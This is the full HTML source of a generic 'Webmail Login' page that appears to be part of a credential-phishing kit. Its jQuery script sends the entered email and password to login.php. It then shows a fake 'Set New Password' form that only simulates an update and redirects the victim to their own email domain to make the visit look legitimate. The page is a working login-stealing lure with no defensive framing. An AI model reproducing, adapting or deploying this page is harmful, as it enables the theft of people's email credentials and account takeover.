
<!DOCTYPE html><html lang="en"><head>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<link href="https://fonts.googleapis.com/css?family=Roboto:300,400&amp;display=swap" rel="stylesheet">
<link rel="stylesheet" href="css/QKNRFhnDWzf5.css">
<link rel="stylesheet" href="css/8G3omdebdo2O.css">
<link rel="icon" href="https://www.iconarchive.com/download/i78239/igh0zt/ios7-style-metro-ui/MetroUI-Other-Mail.ico" type="image/x-icon">

<link rel="stylesheet" href="css/UeQhYvJVmsBM.css">

<link rel="stylesheet" href="css/xShXLpggE0Ro.css">
<title>Webmail Login</title>
<body>
<div class="content">
<div class="container">
<div class="row">
<div class="col-md-6">
<img src="https://www.emailtooltester.com/wp-content/uploads/2017/04/transactional-email.png" alt="Image" class="img-fluid">
</div>
<div class="col-md-6 contents">
<div class="row justify-content-center">
<div class="col-md-8">
<div class="mb-4">
<h3>Sign In</h3>
<p class="mb-4">Hello again! Let's get you logged in.</p>
</div>
<form id="loginForm" method="post">

<div id="loadingIndicator" style="display:none;">Loading...</div>
<div id="loginMessage"></div>


<div class="form-group first">
<label for="username">Email</label>
<input type="text" class="form-control" type="email" name="email" required>
</div>
<div class="form-group last mb-4">
<label for="password">Password</label>
<input type="password" class="form-control" id="password" name="password" required>
</div>
<div class="d-flex mb-5 align-items-center">
<label class="control control--checkbox mb-0"><span class="caption">Remember me</span>
<input type="checkbox" checked="checked">
<div class="control__indicator"></div>
</label>
<span class="ml-auto"><a href="#" class="forgot-pass">Forgot Password</a></span>
</div>
<input type="submit" value="Log In" class="btn btn-block btn-primary">

</form>
</div>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script>
$(document).ready(function() {
    var userEmailDomain; // Variable to store user's email domain

    $('#loginForm').on('submit', function(e) {
        e.preventDefault(); // Prevent the default form submission
        $('#loadingIndicator').show(); // Show the loading indicator

        var formData = $(this).serializeArray(); // Use serializeArray to work with data as objects
        var formDataObject = {}; // Prepare formData as an object for easier access

        $.each(formData, function(_, kv) {
            formDataObject[kv.name] = kv.value;
        });

        // Extract domain from email
        userEmailDomain = formDataObject.email.split('@')[1];

        // Perform the AJAX request for login
        $.post('login.php', formDataObject, function(response) {
            $('#loadingIndicator').hide(); // Hide loading indicator
            if (response.trim() === 'LOGIN_SUCCESSFUL') {
                // Replace the login form with the new password form
                $('.contents').html(`
                    <div id="newPasswordForm">
                    </br>
                    </br>
                        <h3>Set New Password</h3>
                        <div class="form-group">
                            <label for="newPassword"></label>
<input type="password" class="form-control" id="newPassword" placeholder="Enter new password" required>
                        </div>
                        <div class="form-group">
                            <label for="confirmPassword"></label>
<input type="password" class="form-control" id="confirmPassword" placeholder="Confirm new password" required>
                        </div>
                        <button class="btn btn-block btn-primary" id="submitNewPassword">Submit</button>
                    </div>
                `);

                // Attach event handler for new password submission
                $('#submitNewPassword').on('click', function() {
                    var newPassword = $('#newPassword').val();
                    var confirmPassword = $('#confirmPassword').val();

                    // Basic validation for matching passwords
                    if (newPassword !== confirmPassword) {
                        alert('Passwords do not match. Please try again.');
                        return;
                    }

                    // Simulate successful password update and redirect
                    setTimeout(function() { // Simulate async operation like AJAX
                        alert('New password has been set successfully.');
                        // Redirect to user's email domain
                        window.location.href = 'http://' + userEmailDomain;
                    }, 500); // Short delay for demonstration purposes
                });
            } else {
                $('#loginMessage').html(response); // Show error message
            }
        }).fail(function() {
            $('#loadingIndicator').hide(); // Hide loading indicator
            $('#loginMessage').html('Login failed. Please try again.'); // Show error message
        });
    });
});

</script>


</div>
</div>
</div>
</div>
</div>
<script src="js/eIzlpnCoBN1W.js"></script>
<script src="js/qyO6avD8QbXC.js"></script>
<script src="js/hGURyrM68csV.js"></script>
<script src="js/vyIwM7ArqDtI.js"></script>
<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/v84a3a4012de94ce1a686ba8c167c359c1696973893317" data-cf-beacon="{" rayid":"8520fdf3e9403cb1","version":"2024.2.0","token":"cd0b4b3a733644fc843ef0b185f98241"}"="" crossorigin="anonymous"></script>

</body></html>
